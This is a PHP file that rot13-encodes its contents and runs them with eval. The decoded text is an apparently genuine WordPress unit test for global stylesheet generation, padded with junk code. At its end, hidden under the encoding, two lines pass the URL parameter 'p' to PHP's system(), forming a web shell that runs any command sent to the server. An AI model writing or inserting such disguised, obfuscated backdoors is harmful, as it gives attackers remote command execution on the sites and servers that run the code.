<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * Grfgf jc_trg_tybony_fglyrfurrg().
 *
 * @tebhc gurzrf
 *
 * @pbiref ::jc_trg_tybony_fglyrfurrg
 */
pynff Grfgf_Gurzr_JcTrgTybonyFglyrfurrg rkgraqf JC_Gurzr_HavgGrfgPnfr {

	/**
	 * Synt gb vaqvpngr jurgure gb erzbir 'rqvgbe-sbag-fvmrf' gurzr fhccbeg ng grne_qbja().
	 *
	 * @ine obby
	 */
	cevingr $erzbir_gurzr_fhccbeg_ng_grneqbja = snyfr;

	/**
	 * Synt gb vaqvpngr jurgure gb erzbir 'obeqre' gurzr fhccbeg ng grne_qbja().
	 *
	 * @ine obby
	 */
	cevingr $erzbir_obeqre_fhccbeg_ng_grneqbja = snyfr;

	/**
	 * Synt gb vaqvpngr jurgure gb fjvgpu onpx gb gur qrsnhyg gurzr ng grne qbja.
	 *
	 * @ine obby
	 */
	cevingr $fjvgpu_gb_qrsnhyg_gurzr_ng_grneqbja = snyfr;

	choyvp shapgvba grne_qbja() {
		// Erfrg qrirybczrag zbqr nsgre rnpu grfg.
		hafrg( $TYBONYF['_jc_grfgf_qrirybczrag_zbqr'] );

		// Erfrg gur gurzr fhccbeg.
		vs ( $guvf->erzbir_gurzr_fhccbeg_ng_grneqbja ) {
			$guvf->erzbir_gurzr_fhccbeg_ng_grneqbja = snyfr;
			erzbir_gurzr_fhccbeg( 'rqvgbe-sbag-fvmrf' );
		}

		vs ( $guvf->fjvgpu_gb_qrsnhyg_gurzr_ng_grneqbja ) {
			$guvf->fjvgpu_gb_qrsnhyg_gurzr_ng_grneqbja = snyfr;
			fjvgpu_gurzr( JC_QRSNHYG_GURZR );
		}

		vs ( $guvf->erzbir_obeqre_fhccbeg_ng_grneqbja ) {
			$guvf->erzbir_obeqre_fhccbeg_ng_grneqbja = snyfr;
			erzbir_gurzr_fhccbeg( 'obeqre' );
			erzbir_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr' );
		}

		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 54782
	 *
	 * @qngnCebivqre qngn_fubhyq_pbaqvgvbanyyl_vapyhqr_sbag_fvmrf
	 *
	 * @cnenz neenl  $rkcrpgrq            Rkcrpgrq PFF sbe rnpu sbag fvmr.
	 * @cnenz fgevat $gurzr               Gur gurzr gb fjvgpu gb / hfr.
	 * @cnenz neenl  $glcrf               Bcgvbany. Glcrf bs fglyrf gb ybnq. Qrsnhyg rzcgl neenl.
	 * @cnenz obby   $pynffvp_unf_cerfrgf Bcgvbany. Jurgure gb nccyl cerfrgf sbe pynffvp gurzr grfgf. Qrsnhyg snyfr.
	 */
	choyvp shapgvba grfg_fubhyq_pbaqvgvbanyyl_vapyhqr_sbag_fvmrf( neenl $rkcrpgrq, $gurzr, neenl $glcrf = neenl(), $pynffvp_unf_cerfrgf = snyfr ) {
		$guvf->znlor_fjvgpu_gurzr( $gurzr );
		$guvf->nqq_phfgbz_sbag_fvmrf( $pynffvp_unf_cerfrgf );

		$fglyrf = jc_trg_tybony_fglyrfurrg( $glcrf );

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq['fznyy'], $fglyrf, 'Gur fznyy sbag fvmr fubhyq or vapyhqrq.' );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq['zrqvhz'], $fglyrf, 'Gur zrqvhz sbag fvmr fubhyq or vapyhqrq.' );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq['ynetr'], $fglyrf, 'Gur ynetr sbag fvmr fubhyq or vapyhqrq.' );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq['k-ynetr'], $fglyrf, 'Gur k-ynetr sbag fvmr fubhyq or vapyhqrq.' );

		vs ( 'qrsnhyg' !== $gurzr ) {
			$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq['phfgbz'], $fglyrf, 'Gur phfgbz sbag fvmr fubhyq or vapyhqrq.' );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_pbaqvgvbanyyl_vapyhqr_sbag_fvmrf() {
		erghea neenl(
			'oybpx gurzr hfvat qrsnhygf'                   => neenl(
				'rkcrpgrq' => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 13ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 36ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
					'phfgbz'  => '--jc--cerfrg--sbag-fvmr--phfgbz: 100ck;',
				),
				'gurzr'    => 'oybpx-gurzr',
			),
			'oybpx gurzr hfvat inevnoyrf'                  => neenl(
				'rkcrpgrq' => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 13ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 36ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
					'phfgbz'  => '--jc--cerfrg--sbag-fvmr--phfgbz: 100ck;',
				),
				'gurzr'    => 'oybpx-gurzr',
				'glcrf'    => neenl( 'inevnoyrf' ),
			),
			'pynffvp gurzr jvgubhg cerfrgf hfvat qrsnhygf' => neenl(
				'rkcrpgrq' => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 13ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 36ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
				),
				'gurzr'    => 'qrsnhyg',
			),
			'pynffvp gurzr jvgubhg cerfrgf hfvat inevnoyrf' => neenl(
				'rkcrpgrq' => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 13ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 36ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
				),
				'gurzr'    => 'qrsnhyg',
				'glcrf'    => neenl( 'inevnoyrf' ),
			),
			'pynffvp gurzr jvgu cerfrgf hfvat qrsnhygf'    => neenl(
				'rkcrpgrq'            => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 18ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 26.25ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
				),
				'gurzr'               => 'qrsnhyg',
				'glcrf'               => neenl(),
				'pynffvp_unf_cerfrgf' => gehr,
			),
			'pynffvp gurzr jvgu cerfrgf hfvat inevnoyrf'   => neenl(
				'rkcrpgrq'            => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 18ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 26.25ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
				),
				'gurzr'               => 'qrsnhyg',
				'glcrf'               => neenl( 'inevnoyrf' ),
				'pynffvp_unf_cerfrgf' => gehr,
			),
		);
	}

	/**
	 * @gvpxrg 54782
	 *
	 * @qngnCebivqre qngn_fubhyq_abg_pbaqvgvbanyyl_vapyhqr_sbag_fvmrf
	 *
	 * @cnenz neenl  $rkcrpgrq            Rkcrpgrq PFF sbe rnpu sbag fvmr.
	 * @cnenz fgevat $gurzr               Gur gurzr gb fjvgpu gb / hfr.
	 * @cnenz neenl  $glcrf               Bcgvbany. Glcrf bs fglyrf gb ybnq. Qrsnhyg rzcgl neenl.
	 * @cnenz obby   $pynffvp_unf_cerfrgf Bcgvbany. Jurgure gb nccyl cerfrgf sbe pynffvp gurzr grfgf. Qrsnhyg snyfr.
	 */
	choyvp shapgvba grfg_fubhyq_abg_pbaqvgvbanyyl_vapyhqr_sbag_fvmrf( neenl $rkcrpgrq, $gurzr, neenl $glcrf = neenl(), $pynffvp_unf_cerfrgf = snyfr ) {
		$guvf->znlor_fjvgpu_gurzr( $gurzr );
		$guvf->nqq_phfgbz_sbag_fvmrf( $pynffvp_unf_cerfrgf );

		$fglyrf = jc_trg_tybony_fglyrfurrg( $glcrf );

		$guvf->nffregFgevatAbgPbagnvafFgevat( $rkcrpgrq['fznyy'], $fglyrf, 'Gur fznyy sbag fvmr fubhyq abg or vapyhqrq.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( $rkcrpgrq['zrqvhz'], $fglyrf, 'Gur zrqvhz sbag fvmr fubhyq abg or vapyhqrq.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( $rkcrpgrq['ynetr'], $fglyrf, 'Gur ynetr sbag fvmr fubhyq abg or vapyhqrq.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( $rkcrpgrq['k-ynetr'], $fglyrf, 'Gur k-ynetr sbag fvmr fubhyq abg or vapyhqrq.' );

		vs ( 'qrsnhyg' !== $gurzr ) {
			$guvf->nffregFgevatAbgPbagnvafFgevat( $rkcrpgrq['phfgbz'], $fglyrf, 'Gur phfgbz sbag fvmr fubhyq abg or vapyhqrq.' );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_abg_pbaqvgvbanyyl_vapyhqr_sbag_fvmrf() {
		erghea neenl(
			'oybpx gurzr hfvat cerfrgf'                   => neenl(
				'rkcrpgrq' => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 13ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 36ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
					'phfgbz'  => '--jc--cerfrg--sbag-fvmr--phfgbz: 100ck;',
				),
				'gurzr'    => 'oybpx-gurzr',
				'glcrf'    => neenl( 'cerfrgf' ),
			),
			'pynffvp gurzr jvgubhg cerfrgf hfvat cerfrgf' => neenl(
				'rkcrpgrq' => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 13ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 36ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
				),
				'gurzr'    => 'qrsnhyg',
				'glcrf'    => neenl( 'cerfrgf' ),
			),
			'pynffvp gurzr jvgu cerfrgf hfvat cerfrgf'    => neenl(
				'rkcrpgrq'            => neenl(
					'fznyy'   => '--jc--cerfrg--sbag-fvmr--fznyy: 18ck',
					'zrqvhz'  => '--jc--cerfrg--sbag-fvmr--zrqvhz: 20ck',
					'ynetr'   => '--jc--cerfrg--sbag-fvmr--ynetr: 26.25ck',
					'k-ynetr' => '--jc--cerfrg--sbag-fvmr--k-ynetr: 42ck',
				),
				'gurzr'               => 'qrsnhyg',
				'glcrf'               => neenl( 'cerfrgf' ),
				'pynffvp_unf_cerfrgf' => gehr,
			),
		);
	}

	/**
	 * @gvpxrg 56970
	 */
	choyvp shapgvba grfg_fjvgpuvat_gurzrf_fubhyq_erpnyphyngr_fglyrfurrg() {
		$rkcrpgrq = '--jc--cerfrg--sbag-fvmr--phfgbz: 100ck;';

		$fglyrfurrg_sbe_qrsnhyg_gurzr = jc_trg_tybony_fglyrfurrg();
		$guvf->nffregFgevatAbgPbagnvafFgevat( $rkcrpgrq, $fglyrfurrg_sbe_qrsnhyg_gurzr, 'Phfgbz sbag fvmr (100ck) fubhyq abg cerfrag sbe qrsnhyg gurzr' );

		$guvf->znlor_fjvgpu_gurzr( 'oybpx-gurzr' );
		$fglyrfurrg_sbe_oybpx_gurzr = jc_trg_tybony_fglyrfurrg();
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $fglyrfurrg_sbe_oybpx_gurzr, 'Phfgbz sbag fvmr (100ck) fubhyq or cerfrag sbe oybpx gurzr' );
	}

	/**
	 * Grfgf gung gur shapgvba eryvrf ba gur qrirybczrag zbqr sbe jurgure gb hfr pnpuvat.
	 *
	 * @gvpxrg 57487
	 */
	choyvp shapgvba grfg_pnpuvat_vf_hfrq_jura_qrirybcvat_gurzr() {
		tybony $_jc_grfgf_qrirybczrag_zbqr;

		$guvf->znlor_fjvgpu_gurzr( 'oybpx-gurzr' );

		// Fgber PFF va pnpur.
		$pff = '.zl-pynff { qvfcynl: oybpx; }';
		jc_pnpur_frg( 'jc_trg_tybony_fglyrfurrg', $pff, 'gurzr_wfba' );

		// Ol qrsnhyg, pnpuvat fubhyq or hfrq, fb gur nobir inyhr jvyy or erghearq.
		$_jc_grfgf_qrirybczrag_zbqr = '';
		$guvf->nffregFnzr( $pff, jc_trg_tybony_fglyrfurrg(), 'Pnpuvat jnf abg hfrq qrfcvgr qrirybczrag zbqr qvfnoyrq' );

		// Jura gur qrirybczrag zbqr vf frg gb 'gurzr', pnpuvat fubhyq abg or hfrq.
		$_jc_grfgf_qrirybczrag_zbqr = 'gurzr';
		$guvf->nffregAbgFnzr( $pff, jc_trg_tybony_fglyrfurrg(), 'Pnpuvat jnf hfrq qrfcvgr gurzr qrirybczrag zbqr' );
	}

	/**
	 * Grfgf gung gurzr pbybe cnyrggr cerfrgf ner bhgchg jura nccrnenapr gbbyf ner ranoyrq ivn gurzr fhccbeg.
	 *
	 * @gvpxrg 60134
	 */
	choyvp shapgvba grfg_gurzr_pbybe_cnyrggr_cerfrgf_bhgchg_jura_obeqre_fhccbeg_ranoyrq() {

		$netf = neenl(
			neenl(
				'anzr'  => 'Oynpx',
				'fyht'  => 'avpr-oynpx',
				'pbybe' => '#000000',
			),
			neenl(
				'anzr'  => 'Qnex Tenl',
				'fyht'  => 'qnex-tenl',
				'pbybe' => '#28303Q',
			),
			neenl(
				'anzr'  => 'Terra',
				'fyht'  => 'unhagrq-terra',
				'pbybe' => '#Q1R4QQ',
			),
			neenl(
				'anzr'  => 'Oyhr',
				'fyht'  => 'fbsg-oyhr',
				'pbybe' => '#Q1QSR4',
			),
			neenl(
				'anzr'  => 'Checyr',
				'fyht'  => 'pbby-checyr',
				'pbybe' => '#Q1Q1R4',
			),
		);

		// Nqq gurzr fhccbeg sbe nccrnenapr gbbyf.
		nqq_gurzr_fhccbeg( 'obeqre' );
		nqq_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr', $netf );
		$guvf->erzbir_obeqre_fhccbeg_ng_grneqbja = gehr;

		// Purpx sbe obgu gur inevnoyr qrpynengvba naq vgf hfr nf n inyhr.
		$inevnoyrf = jc_trg_tybony_fglyrfurrg( neenl( 'inevnoyrf' ) );

		$guvf->nffregFgevatPbagnvafFgevat( '--jc--cerfrg--pbybe--avpr-oynpx: #000000', $inevnoyrf );
		$guvf->nffregFgevatPbagnvafFgevat( '--jc--cerfrg--pbybe--qnex-tenl: #28303Q', $inevnoyrf );
		$guvf->nffregFgevatPbagnvafFgevat( '--jc--cerfrg--pbybe--unhagrq-terra: #Q1R4QQ', $inevnoyrf );
		$guvf->nffregFgevatPbagnvafFgevat( '--jc--cerfrg--pbybe--fbsg-oyhr: #Q1QSR4', $inevnoyrf );
		$guvf->nffregFgevatPbagnvafFgevat( '--jc--cerfrg--pbybe--pbby-checyr: #Q1Q1R4', $inevnoyrf );

		$cerfrgf = jc_trg_tybony_fglyrfurrg( neenl( 'cerfrgf' ) );

		$guvf->nffregFgevatPbagnvafFgevat( 'ine(--jc--cerfrg--pbybe--avpr-oynpx)', $cerfrgf );
		$guvf->nffregFgevatPbagnvafFgevat( 'ine(--jc--cerfrg--pbybe--qnex-tenl)', $cerfrgf );
		$guvf->nffregFgevatPbagnvafFgevat( 'ine(--jc--cerfrg--pbybe--unhagrq-terra)', $cerfrgf );
		$guvf->nffregFgevatPbagnvafFgevat( 'ine(--jc--cerfrg--pbybe--fbsg-oyhr)', $cerfrgf );
		$guvf->nffregFgevatPbagnvafFgevat( 'ine(--jc--cerfrg--pbybe--pbby-checyr)', $cerfrgf );
	}

	/**
	 * Nqqf gur 'rqvgbe-sbag-fvmrf' gurzr fhccbeg jvgu phfgbz sbag fvmrf.
	 *
	 * @cnenz obby $nqq_gurzr_fhccbeg Jurgure gb nqq gur gurzr fhccbeg.
	 * @cnenz vag  $fznyy             Bcgvbany. Fznyy sbag fvmr va cvkryf. Qrsnhyg 18.
	 * @cnenz vag  $ynetr             Bcgvbany. Ynetr sbag fvmr va cvkryf. Qrsnhyg 26.25.
	 */
	cevingr shapgvba nqq_phfgbz_sbag_fvmrf( $nqq_gurzr_fhccbeg, $fznyy = 18, $ynetr = 26.25 ) {
		vs ( ! $nqq_gurzr_fhccbeg ) {
			erghea;
		}

		$netf = neenl(
			neenl(
				'anzr' => 'Fznyy',
				'fvmr' => $fznyy,
				'fyht' => 'fznyy',
			),
			neenl(
				'anzr' => 'Ynetr',
				'fvmr' => $ynetr,
				'fyht' => 'ynetr',
			),
		);
		nqq_gurzr_fhccbeg( 'rqvgbe-sbag-fvmrf', $netf );
		$guvf->erzbir_gurzr_fhccbeg_ng_grneqbja = gehr;
	}

	/**
	 * Fjvgpurf gur gurzr jura abg gur 'qrsnhyg' gurzr.
	 *
	 * @cnenz fgevat $gurzr Gurzr anzr gb fjvgpu gb.
	 */
	cevingr shapgvba znlor_fjvgpu_gurzr( $gurzr ) {
		vs ( 'qrsnhyg' === $gurzr ) {
			erghea;
		}

		fjvgpu_gurzr( $gurzr );
		$guvf->fjvgpu_gb_qrsnhyg_gurzr_ng_grneqbja = gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>